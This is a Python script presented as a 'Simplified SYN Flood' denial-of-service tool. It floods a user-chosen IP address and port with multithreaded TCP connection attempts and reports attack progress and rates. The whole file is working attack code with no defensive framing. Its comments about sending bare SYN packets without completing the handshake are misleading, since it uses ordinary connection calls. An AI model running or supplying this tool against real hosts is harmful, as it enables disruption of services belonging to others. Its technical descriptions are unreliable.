#!/usr/bin/env python3
# Simplified SYN Flood using higher-level socket API for macOS compatibility
import socket
import random
import time
import sys
import os
from threading import Thread

# Target settings (default values)
TARGET_IP = "127.0.0.1"
TARGET_PORT = 8080

def syn_packet(target_ip, target_port):
    """Attempt to create a SYN packet by connecting and immediately closing"""
    try:
        # Create a normal TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Set a very short timeout to make it non-blocking
        s.settimeout(0.1)
        
        # Connect to the target (sends SYN)
        s.connect_ex((target_ip, target_port))
        
        # Close immediately (we don't want to complete the handshake)
        s.close()
        
        return True
    except:
        return False

def worker(target_ip, target_port, count, delay, thread_id):
    """Worker thread to send SYN packets"""
    sent = 0
    for i in range(count):
        try:
            if syn_packet(target_ip, target_port):
                sent += 1
                
            # Print progress occasionally
            if (i+1) % 100 == 0:
                print(f"[*] Thread {thread_id}: Sent {i+1} connection attempts")
                
            # Add delay if specified
            if delay > 0:
                time.sleep(delay)
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] Thread {thread_id} error: {e}")
            continue
            
    return sent

def run_attack(target_ip=TARGET_IP, target_port=TARGET_PORT, count=1000, delay=0.01, threads=1):
    """Run the SYN flood attack"""
    print(f"[*] Starting SYN flood attack on {target_ip}:{target_port}")
    print(f"[*] Using {threads} threads to send {count} connection attempts with {delay}s delay")
    
    start_time = time.time()
    
    # Create and start worker threads
    thread_list = []
    packets_per_thread = count // threads
    
    for i in range(threads):
        # Last thread gets any remaining packets
        if i == threads - 1:
            thread_count = packets_per_thread + (count % threads)
        else:
            thread_count = packets_per_thread
            
        t = Thread(target=worker, args=(target_ip, target_port, thread_count, delay, i+1))
        thread_list.append(t)
        t.daemon = True
        t.start()
    
    # Wait for all threads to complete
    for t in thread_list:
        t.join()
    
    # Calculate stats
    elapsed_time = time.time() - start_time
    print(f"[+] Attack completed in {elapsed_time:.2f} seconds")
    print(f"[+] Attempted to send approximately {count} SYN packets")
    print(f"[+] Average rate: {count / elapsed_time if elapsed_time > 0 else 0:.2f} attempts/second")

if __name__ == "__main__":
    # Parse command line arguments manually (simpler than argparse)
    args = sys.argv[1:]
    target_ip = TARGET_IP
    target_port = TARGET_PORT
    count = 1000
    delay = 0.01
    threads = 1
    
    # Very simple argument parsing
    i = 0
    while i < len(args):
        if args[i] == "-t" or args[i] == "--target":
            if i+1 < len(args):
                target_ip = args[i+1]
                i += 2
            else:
                print("[-] Error: Missing target IP")
                sys.exit(1)
        elif args[i] == "-p" or args[i] == "--port":
            if i+1 < len(args):
                try:
                    target_port = int(args[i+1])
                    i += 2
                except ValueError:
                    print(f"[-] Error: Invalid port number: {args[i+1]}")
                    sys.exit(1)
            else:
                print("[-] Error: Missing port number")
                sys.exit(1)
        elif args[i] == "-c" or args[i] == "--count":
            if i+1 < len(args):
                try:
                    count = int(args[i+1])
                    i += 2
                except ValueError:
                    print(f"[-] Error: Invalid packet count: {args[i+1]}")
                    sys.exit(1)
            else:
                print("[-] Error: Missing packet count")
                sys.exit(1)
        elif args[i] == "-d" or args[i] == "--delay":
            if i+1 < len(args):
                try:
                    delay = float(args[i+1])
                    i += 2
                except ValueError:
                    print(f"[-] Error: Invalid delay: {args[i+1]}")
                    sys.exit(1)
            else:
                print("[-] Error: Missing delay value")
                sys.exit(1)
        elif args[i] == "-n" or args[i] == "--threads":
            if i+1 < len(args):
                try:
                    threads = int(args[i+1])
                    i += 2
                except ValueError:
                    print(f"[-] Error: Invalid thread count: {args[i+1]}")
                    sys.exit(1)
            else:
                print("[-] Error: Missing thread count")
                sys.exit(1)
        elif args[i] == "-h" or args[i] == "--help":
            print("Usage: python syn_flood.py [options]")
            print("Options:")
            print("  -t, --target TARGET  Target IP address (default: 127.0.0.1)")
            print("  -p, --port PORT      Target port (default: 8080)")
            print("  -c, --count COUNT    Number of packets to send (default: 1000)")
            print("  -d, --delay DELAY    Delay between packets in seconds (default: 0.01)")
            print("  -n, --threads NUM    Number of threads to use (default: 1)")
            print("  -h, --help           Show this help message and exit")
            sys.exit(0)
        else:
            print(f"[-] Error: Unknown option: {args[i]}")
            print("Use -h or --help for usage information")
            sys.exit(1)
    
    # Run the attack
    run_attack(target_ip, target_port, count, delay, threads)